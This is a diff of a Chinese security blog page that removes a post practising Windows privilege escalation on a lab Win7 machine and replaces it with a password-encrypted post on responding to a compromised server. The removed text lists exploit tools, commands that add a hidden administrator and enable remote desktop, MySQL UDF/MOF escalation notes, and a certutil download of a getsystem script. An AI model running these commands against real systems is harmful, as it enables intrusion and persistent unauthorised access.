@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">Windows-提权 | Cupid&#39;s Blog</title>
+  <title itemprop="name">针对被打穿服务器应急的一次总结 | Cupid&#39;s Blog</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -350,11 +350,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/tperch/jsd/img/20200510151324.png">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/VueBase.47o1i9wyc8w0.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/VueBase.47o1i9wyc8w0.png">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      Windows-提权</h1>
+      针对被打穿服务器应急的一次总结</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -366,7 +366,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2021-1-11<span class="bull">
+        2021-4-12<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -380,72 +380,15 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <h2><span id="0x00背景">0X00背景</span></h2><p>今天看到了Bypass的一篇提权文章，大体列出了基本的提权方式。就这些提权方式来进行实际利用实践下。</p>
-<h2><span id="0x01实践开始">0x01实践开始</span></h2><h3><span id="1通过补丁号对比提权">1.通过补丁号对比提权</span></h3><pre><code>补丁对比工具:
-https://github.com/AonCyberLabs/Windows-Exploit-Suggester
-对应exp:
-https://github.com/SecWiki/windows-kernel-exploits</code></pre><p>环境:虚拟机Win7</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111101411003.png" alt="image-20210111101411003"></p>
-<p>首先让其上线，然后信息收集systeminfo（主要补丁号）:</p>
-<pre><code>systeminfo</code></pre><p><img src="/2021/01/11/Windows-提权/image-20210111101544063.png" alt="image-20210111101544063"></p>
-<p>不愧是靶机。。</p>
-<p>算了只是走个流程:</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111101947094.png" alt="image-20210111101947094"></p>
-<p>先是更新补丁库，然后会写入一个xls文件。</p>
-<p>然后进行对比寻找可利用exp:</p>
-<pre><code>python windows-exploit-suggester.py --database 2021-01-11-mssb.xls --systeminfo win7.txt</code></pre><p><img src="/2021/01/11/Windows-提权/image-20210111103343009.png" alt="image-20210111103343009"></p>
-<p>紧接着是报错。网上搜索了下新的这个xlrd不支持xlsx了。</p>
-<p>换个老版本:</p>
-<pre><code class="python">python -m pip uninstall xlrd
-python -m pip install xlrd==1.2.0 -i http://pypi.douban.com/simple --trusted-host pypi.douban.com</code></pre>
-<p><img src="/2021/01/11/Windows-提权/image-20210111103543443.png" alt="image-20210111103543443"></p>
-<p>毫无疑问都可以用。。</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111103726449.png" alt="image-20210111103726449"></p>
-<p>那就直接用cs的16-016</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111103801608.png" alt="image-20210111103801608"></p>
-<p>刚刚这个工具也查出来了:</p>
-<p>OK不智能的情况出现了:</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111103847874.png" alt="image-20210111103847874"></p>
-<p>我给你整个systeminfo信息。你就不能对一下版本。。</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111104551222.png" alt="image-20210111104551222"></p>
-<p>最后用14 -058拿到了system权限。</p>
-<p>接下来是一些常规操作:</p>
-<pre><code>添加管理员
-
-net user 用户名 密码 /add
-net localgroup Administrators 用户名 /add
-
-开启远程桌面
-
-# 开启远程
-REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
-# 查询远程端口
-REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</code></pre><h3><span id="2数据库提权">2.数据库提权</span></h3><p>bypss文章中主要讲了Mysql和sql server提权，这些以前也都搞过的。</p>
-<h4><span id="oracle">Oracle</span></h4><p>先看一下oracle提权:</p>
-<p>数据库提权一般都会利用到存储过程，而oracle也可以利用到存储过程的缺陷将低权限提权到高权限。</p>
-<p>主要利用一个工具odat：</p>
-<pre><code>https://github.com/quentinhardy/odat/releases/tag/4.3</code></pre><h4><span id="mysql">MYSQL</span></h4><pre><code>udf:通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令。将mysql账号root转化为系统system权限。
-mof:在windows平台下,c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间(很短暂)就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。
-启动项:将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。</code></pre><p>UDF:</p>
-<p><img src="/2021/01/11/Windows-提权/image-20210111111926078.png" alt="image-20210111111926078"></p>
-<p>首先使用命令行检查相关Mysql路径以及权限。</p>
-<p>之前我记得在哪看到过NULL，代表莫法使用udf进行提权，而如果是空的就可以写入自定义函数。</p>
-<p>在网上找到了解决方案:<a href="https://www.cnblogs.com/jiangfeilong/p/11311896.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiangfeilong/p/11311896.html</a></p>
-<pre><code>secure_file_priv
-这个参数用来限制数据导入和导出操作效果，例如执行LOAD DATA、SELECT ...INTO OUTFILE语句以及LOAD_FILE()函数。这些操作需要用户具有FILE权限，
-如果这个参数为空，这个变量没有效果。注意这里的空代表空白。
-而NULL的话，mysql服务会禁止导入和导出操作，这个参数在mysql 5.7.6版本引入。
-这上面这一句话要好好斟酌哈。。。我的就低于这个版本：</code></pre><p><img src="/2021/01/11/Windows-提权/image-20210111113223949.png" alt="image-20210111113223949"></p>
-<p>打脸。。</p>
-<h4><span id="sql-server">SQL SERVER</span></h4><h3><span id="3bypass-uac提权">3.Bypass UAC提权</span></h3><p>UAC(User Account Control，用户账号控制)，是微软引入的一种安全机制。Bypass UAC提权，可以将管理员权限提升到system权限。</p>
-<pre><code>msf：
-use exploit/windows/local/bypassuac
-cs：
-点一下。。。 </code></pre><p>4.利用Powershell直接提权至system</p>
-<p>脚本下载:</p>
-<pre><code>certutil -urlcache -split -f https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1</code></pre><p>挂。。VPN去浏览器下载下来吧</p>
-<p>参考文章:<a href="https://mp.weixin.qq.com/s/F4delQDvnjCUIQet1-rS1Q" target="_blank" rel="noopener">Bypass公众号-Windows提权的几种常用姿势</a></p>
-
+          <div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <div class="hbe-input-container">
+  <input type="password" id="hbePass" placeholder="" />
+    <label for="hbePass">Hey, password is required here.</label>
+    <div class="bottom-line"></div>
+  </div>
+  <script id="hbeData" type="hbeData" data-hmacdigest="802783e9f483a5ddf9f7e9716c5d3f06ebf9f9ee5296ca853cb3ee9b18d07e0b">d53a2a0859502f604f5a07f19c974504fe6ba42c14f81b1d087ca1d50d2aeca6695a73d3deb5c24005c05c7fb47806a078548d1ec881c876cfe242ae0ad4b168f67814a0d2b241cedcebdceb397b6e1f8fa0bc7ec9e53dc1c77b77b98e50e0c64746e1b47bfac071880c74a438ca9ec353ef22efa31b853b23f0e6d8e1e7d81f425a0f2acf79bab4bd2fad50b71de4900ff17af3969bc89c21e83560f74bbc0f7f2a97011323943592a242add3e02ca2dfec6de4a007df614bfd6da6f8b8af38588b1c22ad5fec2537be1be9d7f53b6fb724008eb47357505fac1db499e3497057f4a10c2f53175896d8600ed99b1d314204a9cec6ddaba98ccab01c9518ef8036102ba74655b9beeaf6dcb8249fb97069556eae13b24997786281e89af36b2a924a4c583f1e4edfe9768156d191825e73d0c8d260b2d3c1bc8f4c7bba2969bebf4057e2b3d34bd488c087189e62dd05af33928b920f2a902198cfdda1d7b9e6aa788134676fa52e6b42bc75595ba76a7145e22e4ba975462184f6ed06b77dd3de075cbbb1455c594a43eaf61db7ec18a348ad0e2605ba99a0639bfcec3c2e2562e00d1977b09061412895caa5c336f8010910e67707a8a5c371ae7f27b31eb80bbd5f1e9ae5b303d05cbe43fb7510c9b24c19bc97fb718c739b16950f2ff7e19f290a636ba2c4d061038d4dc88c1b694770b8f7c236111b6307a36a896e6563eed33c75e85c3aedceca4345a9e5beb937caa959f292bba9bf490ca0544c52ff53e6a1a25b662ecbde4ea604655960ea9f59127d2c6f0e546465d0c03c5259291fa2b02541068dfb312019356d843acefb41391d8d7d8ecffab97118d2776e999bd90571dc4edfed494b92eed0cd0e894fe5e0a943273e65469c423c5706b569199f76b7b84e16f4da3ea2fdc872784e2b77badfd2642612066c956d9a16475a6a812fedd432b709e8bcbfaefbd72b780d19a4440c054d8344b3532c2f73498780062baeaedcd93f92924cfa66820c8389daec6fa380427d27eecfe8b063be1675ea3de1304ef7bad63f511d36274fed709cc9f873671b2524fc0b831c3678ac808d2d2b3356888f8156fe468f1d9d2ae732a1e80e36cc15ae47131ce9f5ee7782efb56a75346696d1b89433ba486c432923c38903fc0a428515f57afaf8148749889b5877f1575f2581d19745a6e12e86bebe0b16e3c9d45dfd9b268eb0ad2bfe5494e9b6cdfa3e4a917512d73aafd21029431e02eeff98f19f6d263dac5c917599627632d0b39acf125a4de0d8c3b45cefae37769d3265f971cf5211d2c0ed226c0baa6aeb5f59b9ff59c4ec83871b2ea4db47d08aec6886ed54af3efdca8f00e4026e9ee2313e5d7a59d47ce6fd155402e8e652257dcbe657787b75b9f6677ba212f2821d72d819942f877345f8267fe3330d942db307b0f06d4210d8006789e78e7e95b5317d94b6f9538146e036176a90a13b53fa04cb38ec98a2a8989f4bc8fc6fa304264e074436eb0dd51594da9774346a50d1ad424ea366c619c915c0f8dd5329baaec06964e49fad7aafebdbe82e9238ed7e6c3b9f60f4b3cec2d106649a6bce09a13cc1ebb704fc564177735ec367f4ffc0859678d4800f319f2000f1a43058a719805002abd0786ab7dc9dd6daea2d89be1c4501880a24fddfa4a6c143a80ce137551e2c8bfdddb74b28b8172937a6e20beb40dd1398e38b7d36718b126111563249eee841fab42223582e225c5b03d9055dd9832ff5a1172c87cfb37bf337dace6f08e5119fd2012bcc213c2f23c9befd9ca51cc77c4f4837faf27defd1b93bc4c62c92ff75da89af17ae655950c0be6fa6e8eb18c7831fc813a9a867a987dcadb31dec9f45d22280d54f4e90d965ea4490ab34222bbb6073e375f580001017981161f828e251d59a82243874eb33f7841ed69824d41c7f3f658eff495dd504fa2ce924d8266d5ccf0d770f145d3b56eaf49352fec6c71779ce9845ca7f9b340c794399bf79d61f191f8374b2b03a22342cd22dacee14df19a6822f24cbeeaa09dafc0f7eaf5d2d286c987b99262fd283ea6a554ed55f7c9a8669ec2936d933e577472bb7b261629276134164b6216474773ceb3089ac1b3a379f3793b38604d75116213e1892b40249d497b4e33a4ad184c97b87952c1d9c22d39aa72590aa51aa040bc6118819eb37c30915f2390d43adc9320d1bde93431466abdac30cd5ebbbdd0f5209cf8ff6a47e735af03449ded15671beae83bae6d0d3ce1a5d978b9611aa655bd13f3c73d525392ac2f214a6a1ff8058afad0ee9c0a531e30039246e3b497a442a927d0afafb5e28c1f81b98eeb67320e7552ce31b9e6feed6cab0fa0d628f256f7cbc0f24fe35f71ae1527c872d0b434633561e069d3fa46e1f14d25652a5c01fca06168a4d5c6f4c63a3da54b9202af0f3e254d0732c9770fa382da6239aa99a08fb94d9f8929f14a17fc66444928140aa398935c320995f6843044540d2652bc7bc7373947f0e9a0abc97231a40caad0e8cdb002c24738a5b228ecc1de18ea1e878bed076705fd5cc801779a86e6f612a52420a155d4c5d2f996b1a570d3800d06dee7090359b0b3008c0ea5d7e917879b267d45acda2aa4ce216e4c95d98aca77536f0cf0d5c27a8d98d54c55a34e6dd2605cb248c6e5f50ff98936c41dd33b490af6140ae6afcefb6ecd7b0765ec460bffad52b4915fb6a10849576c1fb011c52852c599e070ee2abef08a495c0307b752535eba66012deb0f640f05699c217cf6f234d62cf88e457aba471fd013594affc07927755973f0bb7ac9ef7f054667b67b30ce2f0187a0039c57a8c03edf98dc90ec8bf666db78b404909b8a62fd941af613c8a40ba9464a1bb51255127f9b50f6ddf04a8c279b59027a4a3240c23d5cbff480c1905f86aa308de3b85bf44521b05717088ba3f2a4aa5e435142663d557400dd07b0912a6725571d9c2292abd360067cefbf6db91d104ebdf39ab1a968a628ac6dd0e0b33c58c5f73995fe16af534de9de75e9bfedf769518916aee9b1e10dced4870242b2a93fe044edde9f1a1b2331690cb7cc7cf0d41eebf522df6bb928d5a5503ff65c5923bd8cdab97c17546c5e744dbb0fad812ce54a7261fe29ac02cec94b02a00f23336b0f31ca09cca128d870a48c952b305bef2aaee16dd00c6ec22b501a92ed4ddd80032cfc3a6ffb787bd4b5de67c7a1b42650cef8e75da430579e792b5e25d3072392a946f9ba57f026ff0489d3dbfdf9d0c6e4e9af61679bb699f357632b20374826a5f3e1dd3628453e67687295f296b22cac6ea57a27ac67b7eb9221fd9da02cb304aa5f3e554a05c1c81161ca44be1860ad3c0ee2bb714413b62832df8ec7db877186eff7aa9f6e60ee0815bdacd5546d730c0a535fd301f169bcb56c6c6798766b1e860cf266e96d7d9d0dd0e64c06e09d9f6a741c6626ff1938718b554a4b8dab96fd56c0f4aeba98f18c58ad32c05b007fc352828a66394679aecb58f44282f240db903d7913b1ac4bf82600e6c3b99e4ce27daddd0107f8e87ae13fddcb755d171170c645f11b546e38f003bf5dff4746d4e16b6fe2e0d6edede95a0cd94196afcb20499d1f1064fec0599c35d3ef7da66c15533f9e9c1983b0166c3e83eccb804d7bc25ef0e3231b8fcc20472694f73be80f4e7f5bf9a4e166b59f47b09d7167908acd9287071e638d50a767d8d8d80038ff13beabbbf91392cb553e6ba1542e9168016f4bd66fca93d7f31d5eea2742dc93af5fa4b1fffdf6b52d1218441e2a211e792a2ec040da4ca0ed57a2d68277acf62f6</script>
+</div>
+<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
         </div>
         <!-- .entry-content -->
         <div class="single-reward">
@@ -473,36 +416,19 @@ cs：
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2021/01/13/反弹shell之文件描述符和重定向/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://blog.nineya.com/upload/2020/04/%E5%B0%81%E9%9D%A224-e710aba9781845eeb1356969251cca98.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://blog.nineya.com/upload/2020/04/%E5%B0%81%E9%9D%A224-e710aba9781845eeb1356969251cca98.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                反弹shell之文件描述符和重定向</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2021/01/08/DC-5靶机复现/" rel="next">
+            <a href="/2021/04/10/浏览器内容嗅探机制/" rel="next">
               <div class="background">
-                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/bugFix2.7fosba83hts0.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/Daisy-1999/CDN/blog/bugFix2.7fosba83hts0.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                DC-5靶机复现</h3>
+                浏览器内容嗅探机制</h3>
                 <hr>
               </div>
             </a>
